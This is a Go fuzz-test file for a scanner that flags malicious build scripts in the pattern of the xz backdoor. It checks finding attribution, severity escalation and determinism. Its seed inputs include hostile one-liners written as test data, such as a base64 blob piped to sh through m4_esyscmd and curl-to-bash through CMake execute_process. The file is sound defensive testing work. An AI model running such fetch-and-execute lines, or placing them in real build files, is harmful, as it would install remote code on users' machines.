package buildscript

import (
	"reflect"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
)

// --- Fuzz target for the build-script content scanner ---
//
// Scan reads attacker-controlled build-script bytes (configure.ac,
// build.rs, setup.py, *.m4, CMakeLists.txt — whatever IsBuildScriptSource
// admits) as DATA and never executes them. It is the xz-gap defense: a
// build script that decodes a blob and shell-execs it is the malware
// shape. The input is fully publisher-controlled, so the scanner must
// stay panic-free and total on any byte sequence.
//
// Like exfilwatch's host scanner, Scan reads whole lines via bufio.Reader
// (not Scanner) so an over-long minified line can't silently halt the
// scan. This harness pins the contract Scan promises on ANY input:
//
//   - no panic (the entropy pass slices byte runs and computes logs)
//   - every finding is attributed to rel, at a 1-based line, with a
//     length-bounded snippet and a known Kind/Severity
//   - the co-occurrence escalation rule holds exactly: a decode/eval/
//     network finding is Strong iff the file exhibits >= 2 distinct
//     behaviour classes; a high-entropy literal is always Strong
//   - output is deterministic (the package promises stable JSON)
//
// Written in-package (not buildscript_test) so the snippet bound can
// assert against the unexported maxSnippet rather than a copied literal.

func addBuildscriptSeeds(f *testing.F) {
	b64alpha := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	highEntropy := b64alpha + b64alpha + b64alpha + b64alpha // 256 chars, ~6 bits/char

	seeds := [][]byte{
		// --- benign (must never escalate) ---
		[]byte(""),
		[]byte("from setuptools import setup\nsetup(name='ok', version='1.0')\n"),
		[]byte("AC_INIT([proj],[1.0])\nAC_PROG_CC\nAC_CONFIG_FILES([Makefile])\n"),

		// --- real attack shapes (mirror buildscript_test fixtures) ---
		[]byte("import base64\nDATA = base64.b64decode(open('d','rb').read())\n"), // lone decode → informational
		[]byte("dnl helper\nm4_esyscmd([echo cGF5bG9hZA== | base64 -d | sh])\n"),  // xz: decode+exec → strong
		[]byte("execute_process(COMMAND sh -c \"curl http://x/y | bash\")\n"),     // fetch+exec → strong
		[]byte("PAYLOAD = '" + highEntropy + "'\n"),                               // high-entropy literal → strong
		[]byte("os.system(requests.get(base64.b64decode(x)))\n"),                  // all three classes on one line

		// --- adversarial / edge ---
		[]byte("X = '" + strings.Repeat("A", 300) + "'\n"),                             // long b64-charset run, LOW entropy → no finding
		[]byte(strings.Repeat("x", 5000) + "eval(" + strings.Repeat("y", 5000) + "\n"), // token in an over-long line
		[]byte("curl http://x | sh"),                                                   // no trailing newline
		[]byte("eval(\r\n base64\r\n"),                                                 // CRLF line endings
		{0x00, 0xff, 'e', 'v', 'a', 'l', '(', 0x80, '\n'},                              // NUL + high bytes around a token
	}
	for _, s := range seeds {
		f.Add(s)
	}
}

// FuzzScan asserts the build-script scanner's safety and logic invariants
// on arbitrary bytes.
func FuzzScan(f *testing.F) {
	addBuildscriptSeeds(f)

	const rel = "build.rs"
	validKind := map[Kind]bool{
		KindDecode: true, KindEvalExec: true,
		KindNetworkFetch: true, KindHighEntropy: true,
	}
	validSeverity := map[Severity]bool{
		SeverityInformational: true, SeverityStrong: true,
	}

	f.Fuzz(func(t *testing.T, content []byte) {
		findings := Scan(rel, content)

		// Reconstruct the escalation predicate from the output: the file
		// escalates when it exhibits >= 2 distinct behaviour classes
		// (decode / eval_exec / network_fetch). High-entropy is not a
		// behaviour class — it stands alone and is always strong.
		behaviours := map[Kind]bool{}
		for _, fd := range findings {
			switch fd.Kind {
			case KindDecode, KindEvalExec, KindNetworkFetch:
				behaviours[fd.Kind] = true
			}
		}
		multi := len(behaviours) >= 2

		for _, fd := range findings {
			assert.Equal(t, rel, fd.File, "every finding must be attributed to rel")
			assert.GreaterOrEqual(t, fd.Line, 1, "Line must be 1-based")
			assert.LessOrEqual(t, len(fd.Snippet), maxSnippet, "Snippet must be length-bounded")
			assert.Truef(t, validKind[fd.Kind], "unknown Kind %q", fd.Kind)
			assert.Truef(t, validSeverity[fd.Severity], "unknown Severity %q", fd.Severity)

			// Severity-escalation invariant — the core of the detector.
			switch fd.Kind {
			case KindHighEntropy:
				assert.Equal(t, SeverityStrong, fd.Severity,
					"a high-entropy literal is always strong on its own")
			default: // decode / eval_exec / network_fetch
				want := SeverityInformational
				if multi {
					want = SeverityStrong
				}
				assert.Equalf(t, want, fd.Severity,
					"behaviour finding must follow the >=2-distinct-class rule (multi=%v)", multi)
			}
		}

		// Determinism: the package fixes catalog order specifically to
		// emit stable JSON across runs.
		assert.True(t, reflect.DeepEqual(findings, Scan(rel, content)),
			"Scan must be deterministic")
	})
}
